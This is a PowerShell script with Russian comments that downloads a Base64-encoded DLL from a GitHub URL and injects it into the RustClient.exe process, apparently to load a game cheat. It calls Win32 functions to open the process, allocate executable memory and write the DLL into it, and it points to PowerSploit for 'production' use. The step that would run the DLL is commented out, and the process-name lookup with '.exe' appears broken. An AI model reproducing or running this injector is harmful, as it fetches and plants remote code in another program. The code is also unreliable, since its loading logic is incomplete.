<#
.SYNOPSIS
    Скачивает Base64-encoded DLL, декодирует её и внедряет в процесс RustClient.exe.
.DESCRIPTION
    Скрипт выполняет следующие действия:
    1. Загружает Base64-строку по указанному URL.
    2. Декодирует её в байтовый массив (DLL).
    3. Находит процесс с именем RustClient.exe.
    4. Внедряет DLL в найденный процесс методом рефлексивной загрузки PE.
.NOTES
    Требуется PowerShell, запущенный с правами администратора.
    Целевой процесс должен быть 64-битным, если PowerShell 64-битный (и наоборот).
#>

# --- Параметры ---
$Url = "https://raw.githubusercontent.com/PUZAN1337/-/refs/heads/main/svin.dll"
$TargetProcessName = "RustClient.exe"

# --- Функция для рефлексивной загрузки PE (упрощённая версия Invoke-ReflectivePEInjection) ---
function Invoke-ReflectivePEInjection {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [Byte[]]$PEBytes,

        [Parameter(Mandatory = $true)]
        [Int32]$ProcId
    )

    # Добавляем необходимые Win32 API через Add-Type
    $Win32Code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

    // Константы
    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE = 0x04;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint MEM_RELEASE = 0x8000;
}
"@

    if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
        Add-Type -TypeDefinition $Win32Code -ErrorAction Stop
    }

    Write-Host "[*] Открытие процесса с PID: $ProcId" -ForegroundColor Cyan
    $hProcess = [Win32]::OpenProcess([Win32]::PROCESS_ALL_ACCESS, $false, $ProcId)
    if ($hProcess -eq [IntPtr]::Zero) {
        throw "Не удалось открыть процесс. Ошибка: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }

    try {
        Write-Host "[*] Выделение памяти в целевом процессе (размер: $($PEBytes.Length) байт)" -ForegroundColor Cyan
        $allocAddr = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$PEBytes.Length, [Win32]::MEM_COMMIT -bor [Win32]::MEM_RESERVE, [Win32]::PAGE_EXECUTE_READWRITE)
        if ($allocAddr -eq [IntPtr]::Zero) {
            throw "Не удалось выделить память. Ошибка: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        }

        Write-Host "[*] Запись DLL в память целевого процесса" -ForegroundColor Cyan
        $bytesWritten = [UIntPtr]::Zero
        $writeResult = [Win32]::WriteProcessMemory($hProcess, $allocAddr, $PEBytes, [uint32]$PEBytes.Length, [ref]$bytesWritten)
        if (-not $writeResult) {
            throw "Не удалось записать память. Ошибка: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        }

        # Для рефлексивной загрузки нужно вызвать LoadLibrary внутри целевого процесса.
        # В упрощённом варианте используем классический LoadLibraryA с путём к DLL.
        # Однако, поскольку DLL передаётся в памяти, корректная рефлексивная загрузка требует
        # вызова экспортируемой функции (например, ReflectiveLoader) внутри DLL.
        # Здесь приведён базовый пример с LoadLibraryA, предполагающий, что DLL уже находится на диске.
        # Для полноценной рефлексивной загрузки из памяти потребуется более сложная логика (парсинг PE, релокации и т.д.).
        Write-Warning "Внимание: Для рефлексивной загрузки DLL из памяти требуется, чтобы DLL содержала экспортируемую функцию ReflectiveLoader, либо используйте классический метод с LoadLibraryA (DLL должна быть на диске)."
        Write-Warning "Данный скрипт демонстрирует базовый механизм внедрения. Для production-использования рекомендуется применять проверенные инструменты, такие как Invoke-ReflectivePEInjection из PowerSploit."

        # Альтернативный вариант: вызов LoadLibraryA с путём к DLL (требует наличия DLL на диске)
        # $kernel32 = [Win32]::GetModuleHandle("kernel32.dll")
        # $loadLibraryAddr = [Win32]::GetProcAddress($kernel32, "LoadLibraryA")
        # $remoteThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocAddr, 0, [IntPtr]::Zero)
        # if ($remoteThread -eq [IntPtr]::Zero) {
        #     throw "Не удалось создать удалённый поток. Ошибка: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        # }
        # [Win32]::WaitForSingleObject($remoteThread, 0xFFFFFFFF) | Out-Null
        # [Win32]::CloseHandle($remoteThread) | Out-Null

        Write-Host "[+] DLL успешно записана в память процесса. Для выполнения кода требуется вызов экспортируемой функции или LoadLibrary." -ForegroundColor Green
    }
    finally {
        if ($hProcess -ne [IntPtr]::Zero) {
            [Win32]::CloseHandle($hProcess) | Out-Null
        }
    }
}

# --- Основная логика ---
try {
    # 1. Скачивание Base64-строки
    Write-Host "[*] Скачивание DLL с $Url" -ForegroundColor Cyan
    $base64String = Invoke-RestMethod -Uri $Url -UseBasicParsing -ErrorAction Stop

    # Удаляем возможные пробелы и переносы строк
    $base64String = $base64String -replace '\s', ''

    # 2. Декодирование из Base64
    Write-Host "[*] Декодирование Base64" -ForegroundColor Cyan
    $dllBytes = [System.Convert]::FromBase64String($base64String)
    Write-Host "[+] Размер DLL: $($dllBytes.Length) байт" -ForegroundColor Green

    # 3. Поиск процесса RustClient.exe
    Write-Host "[*] Поиск процесса $TargetProcessName" -ForegroundColor Cyan
    $targetProcess = Get-Process -Name $TargetProcessName -ErrorAction SilentlyContinue | Select-Object -First 1

    if (-not $targetProcess) {
        throw "Процесс '$TargetProcessName' не найден. Убедитесь, что он запущен."
    }

    Write-Host "[+] Найден процесс: $($targetProcess.ProcessName) (PID: $($targetProcess.Id))" -ForegroundColor Green

    # 4. Внедрение DLL
    Write-Host "[*] Внедрение DLL в процесс с PID $($targetProcess.Id)" -ForegroundColor Cyan
    Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId $targetProcess.Id

    Write-Host "[+] Скрипт завершён успешно." -ForegroundColor Green
}
catch {
    Write-Error "Ошибка: $($_.Exception.Message)"
    Write-Error $_.ScriptStackTrace
}
